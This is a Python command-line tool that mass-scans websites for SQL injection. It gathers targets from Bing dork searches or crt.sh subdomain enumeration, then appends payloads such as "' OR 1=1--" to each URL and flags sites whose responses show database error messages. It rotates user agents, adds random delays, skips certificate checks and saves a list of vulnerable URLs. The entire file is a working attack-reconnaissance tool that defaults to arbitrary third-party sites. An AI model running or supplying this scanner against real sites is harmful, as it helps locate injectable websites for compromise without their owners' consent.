#!/usr/bin/env python3
import argparse
import requests
import time
import random
import re
from bs4 import BeautifulSoup
from urllib.parse import unquote, urlparse, parse_qs
from concurrent.futures import ThreadPoolExecutor

requests.packages.urllib3.disable_warnings()

SQLI_ERRORS = [
    "you have an error in your sql syntax;",
    "mysql_fetch_array()",
    "warning: mysql",
    "unclosed quotation mark after the character string",
    "quoted string not properly terminated",
    "mysql_num_rows()",
    "supplied argument is not a valid MySQL result resource"
]

USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
    'Mozilla/5.0 (X11; Linux x86_64)...',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
]

PAYLOADS = [
    "'", '"', "';", "' OR 1=1--", "' AND 1=2--", "') OR '1'='1", "')--"
]

def print_banner():
    print(r"""
  ____   ___  _     _   _  ___  _   _ _   _ ____  
 / ___| / _ \| |   | | | |/ _ \| | | | \ | |  _ \ 
 \___ \| | | | |   | |_| | | | | | | |  \| | | | |
  ___) | |_| | |___|  _  | |_| | |_| | |\  | |_| |
 |____/ \__\_\_____|_| |_|\___/ \___/|_| \_|____/ 
                                                  
                     V 1.0
    """)

def get_real_url(bing_link):
    """
    Extract real target URL from Bing redirect links if present.
    """
    parsed = urlparse(bing_link)
    if parsed.netloc.endswith("bing.com"):
        qs = parse_qs(parsed.query)
        for key in ['url', 'u', 'q']:
            if key in qs:
                real_url = qs[key][0]
                if real_url.startswith("http"):
                    return real_url
        return None
    else:
        return bing_link

def extract_links_from_dork(dork, limit, domain_filter=None):
    print(f"[+] Searching: {dork}")
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    url = f"https://www.bing.com/search?q={dork}"
    try:
        res = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(res.text, 'html.parser')
        links = []
        for item in soup.find_all('a', href=True):
            raw_link = item['href']
            link = get_real_url(raw_link)
            if not link:
                continue
            link = unquote(link)
            if not link.startswith("http"):
                continue
            if domain_filter:
                netloc = urlparse(link).netloc.lower()
                # filter subdomains by checking endswith
                if not netloc.endswith(domain_filter.lower()):
                    continue
            links.append(link)
        unique_links = list(dict.fromkeys(links))
        print(f"[+] Found {len(unique_links)} links after filtering.")
        return unique_links[:limit]
    except Exception as e:
        print(f"[!] Error fetching links: {e}")
        return []

def get_subdomains(domain):
    print(f"[+] Enumerating subdomains for: {domain}")
    url = f"https://crt.sh/?q=%25.{domain}&output=json"
    try:
        res = requests.get(url, timeout=10)
        data = res.json()
        subdomains = set()
        for entry in data:
            name = entry.get('name_value', '')
            for sub in name.split('\n'):
                if domain in sub:
                    subdomains.add(sub.strip())
        print(f"[+] Found {len(subdomains)} subdomains.")
        return [f"http://{sub}" for sub in sorted(subdomains)] + [f"https://{sub}" for sub in sorted(subdomains)]
    except Exception as e:
        print(f"[!] Failed to enumerate subdomains: {e}")
        return []

def is_vulnerable(url):
    headers = {'User-Agent': random.choice(USER_AGENTS)}
    try:
        for payload in PAYLOADS:
            vuln_url = f"{url}{payload}"
            res = requests.get(vuln_url, headers=headers, timeout=10, verify=False)
            if any(err.lower() in res.text.lower() for err in SQLI_ERRORS):
                print(f"[VULNERABLE] {url}")
                return True
            time.sleep(random.uniform(0.5, 1.5))
    except Exception:
        pass
    print(f"[SAFE] {url}")
    return False

def main():
    print_banner()
    parser = argparse.ArgumentParser()
    parser.add_argument('--dorks', nargs='+', help='List of Google/Bing dorks to search')
    parser.add_argument('--urls', help='Path to file containing URLs to scan directly')
    parser.add_argument('--limit', type=int, default=10, help='Limit number of links per dork')
    parser.add_argument('--threads', type=int, default=5, help='Number of threads for scanning')
    parser.add_argument('--output', help='Save vulnerable URLs to file')
    parser.add_argument('--domain', help='Target domain to enumerate subdomains and scan')
    parser.add_argument('--dorkdomain', help='Restrict dork search results to this domain (e.g., test.com)')
    args = parser.parse_args()

    all_urls = []

    if args.urls:
        with open(args.urls, 'r') as f:
            all_urls.extend([line.strip() for line in f if line.strip()])
    elif args.dorks:
        for dork in args.dorks:
            # pass domain filter if specified
            links = extract_links_from_dork(dork, args.limit, args.dorkdomain)
            all_urls.extend(links)
    elif args.domain:
        all_urls.extend(get_subdomains(args.domain))

    if not all_urls:
        print("[!] No URLs to scan.")
        return

    print(f"[+] Scanning {len(all_urls)} URLs using {args.threads} threads...\n")
    vulnerable_urls = []

    def task(url):
        if is_vulnerable(url):
            vulnerable_urls.append(url)

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        executor.map(task, all_urls)

    if args.output:
        with open(args.output, 'w') as f:
            f.write("\n".join(vulnerable_urls))
        print(f"\n[+] Vulnerable URLs saved to {args.output}")

if __name__ == '__main__':
    main()
